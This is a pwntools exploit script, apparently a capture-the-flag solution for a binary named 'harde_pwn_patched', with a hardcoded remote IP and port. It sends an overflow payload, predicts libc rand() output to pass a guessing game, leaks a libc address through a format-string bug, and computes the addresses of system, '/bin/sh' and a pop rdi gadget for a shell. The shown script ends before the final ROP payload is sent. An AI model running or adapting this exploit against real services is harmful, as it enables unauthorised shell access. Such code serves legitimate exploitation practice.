from pwn import *
import ctypes
import sys
remote_addr = ["47.108.165.60",45479]
libc = ELF('./libc.so.6')
LIBC = ctypes.cdll.LoadLibrary('./libc.so.6')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./harde_pwn_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug('''
    b *$rebase(0x14fb)
''')
payload = b'a' * 0x1c + p32(0)
sa(b'game!\n', payload)
LIBC.srand(0)
for i in range(21):
    num = (LIBC.rand() ^ 0x24) + 1
    sla(b'input: \n', str(num).encode())

def fmt(s):
    sa(b'data ;)\n', s.encode() + b'\x00')

fmt('%11$p')


ru(b'0x')
libc.address = int(rc(12), 16) - 128 - libc.sym['__libc_start_call_main']
pr('libc_base', libc.address)
pop_rdi = libc.address + 0x2a3e5
system = libc.sym['system']
binsh = next(libc.search(b'/bin/sh\x00'))

shell()
